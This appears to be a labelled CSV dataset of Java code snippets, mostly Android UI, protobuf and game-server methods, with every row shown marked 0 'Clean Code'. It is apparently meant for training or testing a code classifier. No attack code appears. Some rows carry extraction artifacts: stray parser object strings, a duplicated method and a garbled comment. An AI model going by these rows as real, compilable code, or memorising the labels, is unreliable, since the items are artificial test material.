text,label,text_label
"@Override public boolean onCustomLayout(View view,int left,int top,int right,int bottom){
  int width=(right - left);
  int height=(bottom - top);
  boolean isPortrait=width < height;
  if (view == cameraPanel) {
    if (isPortrait) {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cameraPanel.layout(0,bottom - AndroidUtilities.dp(126 + 96),width,bottom - AndroidUtilities.dp(96));
      }
 else {
        cameraPanel.layout(0,bottom - AndroidUtilities.dp(126),width,bottom);
      }
    }
 else {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cameraPanel.layout(right - AndroidUtilities.dp(126 + 96),0,right - AndroidUtilities.dp(96),height);
      }
 else {
        cameraPanel.layout(right - AndroidUtilities.dp(126),0,right,height);
      }
    }
    return true;
  }
 else   if (view == zoomControlView) {
    if (isPortrait) {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        zoomControlView.layout(0,bottom - AndroidUtilities.dp(126 + 96 + 38+ 50),width,bottom - AndroidUtilities.dp(126 + 96 + 38));
      }
 else {
        zoomControlView.layout(0,bottom - AndroidUtilities.dp(126 + 50),width,bottom - AndroidUtilities.dp(126));
      }
    }
 else {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        zoomControlView.layout(right - AndroidUtilities.dp(126 + 96 + 38+ 50),0,right - AndroidUtilities.dp(126 + 96 + 38),height);
      }
 else {
        zoomControlView.layout(right - AndroidUtilities.dp(126 + 50),0,right - AndroidUtilities.dp(126),height);
      }
    }
    return true;
  }
 else   if (view == counterTextView) {
    int cx;
    int cy;
    if (isPortrait) {
      cx=(width - counterTextView.getMeasuredWidth()) / 2;
      cy=bottom - AndroidUtilities.dp(113 + 16 + 38);
      counterTextView.setRotation(0);
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cy-=AndroidUtilities.dp(96);
      }
    }
 else {
      cx=right - AndroidUtilities.dp(113 + 16 + 38);
      cy=height / 2 + counterTextView.getMeasuredWidth() / 2;
      counterTextView.setRotation(-90);
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cx-=AndroidUtilities.dp(96);
      }
    }
    counterTextView.layout(cx,cy,cx + counterTextView.getMeasuredWidth(),cy + counterTextView.getMeasuredHeight());
    return true;
  }
 else   if (view == cameraPhotoRecyclerView) {
    if (isPortrait) {
      int cy=height - AndroidUtilities.dp(88);
      view.layout(0,cy,view.getMeasuredWidth(),cy + view.getMeasuredHeight());
    }
 else {
      int cx=left + width - AndroidUtilities.dp(88);
      view.layout(cx,0,cx + view.getMeasuredWidth(),view.getMeasuredHeight());
    }
    return true;
  }
  return false;
}",0,Clean Code
"@Override public void doubleClicked(){
}
",0,Clean Code
"@NonNull public static String describeIntent(@NonNull Intent intent,String prefix){
  String action=intent.getAction();
  String data=intent.getDataString();
  String type=intent.getType();
  Set<String> categories=intent.getCategories();
  ComponentName cn=intent.getComponent();
  String packageName=intent.getPackage();
  int flags=intent.getFlags();
  Bundle extras=intent.getExtras();
  StringBuilder sb=new StringBuilder();
  if (action != null)   sb.append(prefix).append("" ACTION\t"").append(action).append(""\n"");
  if (data != null)   sb.append(prefix).append("" DATA\t"").append(data).append(""\n"");
  if (type != null)   sb.append(prefix).append("" TYPE\t"").append(type).append(""\n"");
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
    String id=intent.getIdentifier();
    if (id != null)     sb.append(prefix).append("" IDENTIFIER\t"").append(id).append(""\n"");
  }
  if (categories != null) {
    for (    String category : categories) {
      sb.append(prefix).append("" CATEGORY\t"").append(category).append(""\n"");
    }
  }
  if (cn != null)   sb.append(prefix).append("" COMPONENT\t"").append(cn.flattenToString()).append(""\n"");
  if (packageName != null)   sb.append(prefix).append("" PACKAGE\t"").append(packageName).append(""\n"");
  if (flags != 0)   sb.append(prefix).append("" FLAGS\t0x"").append(Integer.toHexString(flags)).append(""\n"");
  if (extras != null) {
    for (    String key : extras.keySet()) {
      Pair<Integer,String> typeAndString=valueToParsableStringAndType(extras.get(key));
      if (typeAndString != null) {
        sb.append(prefix).append("" EXTRA\t"").append(key).append(""\t"").append(typeAndString.first);
        if (typeAndString.first != TYPE_NULL) {
          sb.append(""\t"").append(typeAndString.second);
        }
        sb.append(""\n"");
      }
    }
  }
  return sb.toString();
}",0,Clean Code
"/** 
 * <code>optional uint32 cur_chat_bubble = 10;</code>
 * @return this
 */
public SelectChatBubbleScRsp clearCurChatBubble(){
  bitField0_&=~0x00000002;
  curChatBubble=0;
  return this;
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.test.protos.MockMultiOutputInfoProto)) {
    return super.equals(obj);
  }
  org.tribuo.test.protos.MockMultiOutputInfoProto other=(org.tribuo.test.protos.MockMultiOutputInfoProto)obj;
  if (!getLabelList().equals(other.getLabelList()))   return false;
  if (!getCountsList().equals(other.getCountsList()))   return false;
  if (!getIdList().equals(other.getIdList()))   return false;
  if (getUnknownCount() != other.getUnknownCount())   return false;
  if (getLabelCounter() != other.getLabelCounter())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public Builder withPrompt(String prompt){
  this.prompt=prompt;
  return this;
}
public Builder withPrompt(String prompt){
  this.prompt=prompt;
  return this;
}
",0,Clean Code
"void initializedComment(IFunction function,List<CommentType> comment);
",0,Clean Code
"private static String getAppPath(){
  try {
    String jarPath=System.getProperty(""project.path"");
    return FileUtil.getParent(jarPath,4);
  }
 catch (  Exception e) {
    log.error(""getAppPath error"",e);
    return null;
  }
}",0,Clean Code
"void accept(int node,float score);
",0,Clean Code
"@Override public Color getBorderColor(){
  return new Color(m_borderColor.getRGB());
}
",0,Clean Code
"@Override public Optional<Resource> getResource(ResourceLocation id){
  final String path=id.getPath();
  if (path.endsWith(""json"")) {
    return Optional.of(new StringResource(id,json));
  }
 else   if (path.endsWith(""vsh"")) {
    return Optional.of(new StringResource(id,vertex));
  }
 else   if (path.endsWith(""gsh"")) {
    if (geometry == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,geometry));
  }
 else   if (path.endsWith(""tcs"")) {
    if (tessControl == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,tessControl));
  }
 else   if (path.endsWith(""tes"")) {
    if (tessEval == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,tessEval));
  }
 else   if (path.endsWith(""fsh"")) {
    return Optional.of(new StringResource(id,fragment));
  }
  return Optional.empty();
}
",0,Clean Code
"private CRFParametersProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private CRFParametersProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4b0cc719",0,Clean Code
"public void onDetachedFromWindow(){
  if (!attachedToWindow) {
    return;
  }
  attachedToWindow=false;
  if (currentImageLocation != null || currentMediaLocation != null || currentThumbLocation != null || staticThumbDrawable != null) {
    if (setImageBackup == null) {
      setImageBackup=new SetImageBackup();
    }
    setImageBackup.mediaLocation=currentMediaLocation;
    setImageBackup.mediaFilter=currentMediaFilter;
    setImageBackup.imageLocation=currentImageLocation;
    setImageBackup.imageFilter=currentImageFilter;
    setImageBackup.thumbLocation=currentThumbLocation;
    setImageBackup.thumbFilter=currentThumbFilter;
    setImageBackup.thumb=staticThumbDrawable;
    setImageBackup.size=currentSize;
    setImageBackup.ext=currentExt;
    setImageBackup.cacheType=currentCacheType;
    setImageBackup.parentObject=currentParentObject;
  }
  if (!ignoreNotifications) {
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.didReplacedPhotoInMemCache);
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.stopAllHeavyOperations);
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.startAllHeavyOperations);
  }
  if (staticThumbDrawable instanceof AttachableDrawable) {
    ((AttachableDrawable)staticThumbDrawable).onDetachedFromWindow(this);
  }
  if (staticThumbDrawable != null) {
    setStaticDrawable(null);
    thumbShader=null;
    roundPaint.setShader(null);
  }
  clearImage();
  if (isPressed == 0) {
    pressedProgress=0f;
  }
  AnimatedFileDrawable animatedFileDrawable=getAnimation();
  if (animatedFileDrawable != null) {
    animatedFileDrawable.removeParent(this);
  }
  RLottieDrawable lottieDrawable=getLottieAnimation();
  if (lottieDrawable != null) {
    lottieDrawable.removeParentView(this);
  }
}",0,Clean Code
"private static BiomeCategories getBiomeCategory(Holder<Biome> holder){
  if (holder.is(BiomeTags.WITHOUT_WANDERING_TRADER_SPAWNS)) {
    return BiomeCategories.NONE;
  }
 else   if (holder.is(BiomeTags.HAS_VILLAGE_SNOWY)) {
    return BiomeCategories.ICY;
  }
 else   if (holder.is(BiomeTags.IS_HILL)) {
    return BiomeCategories.EXTREME_HILLS;
  }
 else   if (holder.is(BiomeTags.IS_TAIGA)) {
    return BiomeCategories.TAIGA;
  }
 else   if (holder.is(BiomeTags.IS_OCEAN)) {
    return BiomeCategories.OCEAN;
  }
 else   if (holder.is(BiomeTags.IS_JUNGLE)) {
    return BiomeCategories.JUNGLE;
  }
 else   if (holder.is(BiomeTags.IS_FOREST)) {
    return BiomeCategories.FOREST;
  }
 else   if (holder.is(BiomeTags.IS_BADLANDS)) {
    return BiomeCategories.MESA;
  }
 else   if (holder.is(BiomeTags.IS_NETHER)) {
    return BiomeCategories.NETHER;
  }
 else   if (holder.is(BiomeTags.IS_END)) {
    return BiomeCategories.THE_END;
  }
 else   if (holder.is(BiomeTags.IS_BEACH)) {
    return BiomeCategories.BEACH;
  }
 else   if (holder.is(BiomeTags.HAS_DESERT_PYRAMID)) {
    return BiomeCategories.DESERT;
  }
 else   if (holder.is(BiomeTags.IS_RIVER)) {
    return BiomeCategories.RIVER;
  }
 else   if (holder.is(BiomeTags.HAS_CLOSER_WATER_FOG)) {
    return BiomeCategories.SWAMP;
  }
 else   if (holder.is(BiomeTags.PLAYS_UNDERWATER_MUSIC)) {
    return BiomeCategories.UNDERGROUND;
  }
 else   if (holder.is(BiomeTags.WITHOUT_ZOMBIE_SIEGES)) {
    return BiomeCategories.MUSHROOM;
  }
 else   if (holder.is(BiomeTags.IS_MOUNTAIN)) {
    return BiomeCategories.MOUNTAIN;
  }
 else {
    return BiomeCategories.PLAINS;
  }
}
",0,Clean Code
"/** 
 * <code>optional .SceneBattleInfo battle_info = 7;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableBattleInfo()} if you want to modify it.
 * @return internal storage object for reading
 */
public SceneBattleInfoOuterClass.SceneBattleInfo getBattleInfo(){
  return battleInfo;
}",0,Clean Code
"@Override public long getGuildId(){
  return 0;
}",0,Clean Code
"public Pair<RawFunction,RawFunction> getMatchedFunctionPairAt(final int index){
  return matchedFunctionPairs.get(index);
}
",0,Clean Code
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.locationPermissionGranted) {
    locationDenied=false;
    askedForLocation=false;
    positionMarker();
    if (adapter != null) {
      adapter.setMyLocationDenied(locationDenied,askedForLocation);
    }
    if (searchAdapter != null) {
      searchAdapter.setMyLocationDenied(locationDenied);
    }
    if (map != null) {
      try {
        map.setMyLocationEnabled(true);
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
  }
 else   if (id == NotificationCenter.locationPermissionDenied) {
    locationDenied=true;
    askedForLocation=false;
    if (adapter != null) {
      adapter.setMyLocationDenied(locationDenied,askedForLocation);
    }
    if (searchAdapter != null) {
      searchAdapter.setMyLocationDenied(locationDenied);
    }
  }
  fixLayoutInternal(true);
  searchItem.setVisibility(locationDenied && !parentAlert.isStoryLocationPicker || parentAlert.isBizLocationPicker ? View.GONE : View.VISIBLE);
}
",0,Clean Code
"@Override public LeaveRogueScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  rogueInfo.clear();
  lineup.clear();
  scene.clear();
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 miracle_id = 3;</code>
 * @param value the miracleId to set
 * @return this
 */
public SelectRogueMiracleCsReq setMiracleId(final int value){
  bitField0_|=0x00000001;
  miracleId=value;
  return this;
}",0,Clean Code
"private Function2Nodes(){
}",0,Clean Code
"private ImmutableLabelInfoProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private ImmutableLabelInfoProto(){
  label_=com.google.protobuf.LazyStringArrayList.EMPTY;
  count_=emptyLongList();
  id_=emptyIntList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@776adf0e",0,Clean Code
"private void writeObject(ObjectOutputStream stream) throws IOException {
  stream.write(data.length);
  stream.write(data);
}
",0,Clean Code
"@Override public TimestampData getTimestamp(int i,int precision){
  if (valueVector instanceof TimeStampSecVector) {
    return TimestampData.fromEpochMillis(((TimeStampSecVector)valueVector).get(i) * 1000);
  }
 else   if (valueVector instanceof TimeStampSecTZVector) {
    return TimestampData.fromEpochMillis(((TimeStampSecTZVector)valueVector).get(i) * 1000);
  }
 else   if (valueVector instanceof TimeStampMilliVector) {
    return TimestampData.fromEpochMillis(((TimeStampMilliVector)valueVector).get(i));
  }
 else   if (valueVector instanceof TimeStampMilliTZVector) {
    return TimestampData.fromEpochMillis(((TimeStampMilliTZVector)valueVector).get(i));
  }
 else   if (valueVector instanceof TimeStampMicroVector) {
    long micros=((TimeStampMicroVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(micros / 1000,(int)(micros % 1000) * 1000);
  }
 else   if (valueVector instanceof TimeStampMicroTZVector) {
    long micros=((TimeStampMicroTZVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(micros / 1000,(int)(micros % 1000) * 1000);
  }
 else   if (valueVector instanceof TimeStampNanoVector) {
    long nanos=((TimeStampNanoVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(nanos / 1_000_000,(int)(nanos % 1_000_000));
  }
 else {
    long nanos=((TimeStampNanoTZVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(nanos / 1_000_000,(int)(nanos % 1_000_000));
  }
}",0,Clean Code
"/** 
 * 灏嗘湭鐭ョ被鍨嬭浆鎹负鐩爣绫诲瀷
 */
@SneakyThrows public static Object typeStrConvertObject(Object obj,Class<?> targetType){
  String str=obj.toString();
  if (NumberUtils.isCreatable(str)) {
    if (str.endsWith("".0"")) {
      str=str.substring(0,str.length() - 2);
    }
  }
  if (int.class == targetType || Integer.class == targetType) {
    return Integer.valueOf(str);
  }
 else   if (short.class == targetType || Short.class == targetType) {
    return Short.valueOf(str);
  }
 else   if (long.class == targetType || Long.class == targetType) {
    return Long.valueOf(str);
  }
 else   if (float.class == targetType || Float.class == targetType) {
    return Float.valueOf(str);
  }
 else   if (double.class == targetType || Double.class == targetType) {
    return Double.valueOf(str);
  }
 else   if (BigDecimal.class == targetType) {
    return new BigDecimal(str);
  }
 else   if (boolean.class == targetType || Boolean.class == targetType) {
    return Boolean.valueOf(str);
  }
 else   if (targetType.isEnum()) {
    return targetType.getMethod(""valueOf"",String.class).invoke(targetType,str);
  }
 else {
    return str;
  }
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code ChessRogueAvatar}
 */
public static ChessRogueAvatar newInstance(){
  return new ChessRogueAvatar();
}
",0,Clean Code
"/** 
 * <code>optional .BuffInfo add_buff_info = 7;</code>
 * @return whether the addBuffInfo field is set
 */
public boolean hasAddBuffInfo(){
  return (bitField0_ & 0x00000004) != 0;
}",0,Clean Code
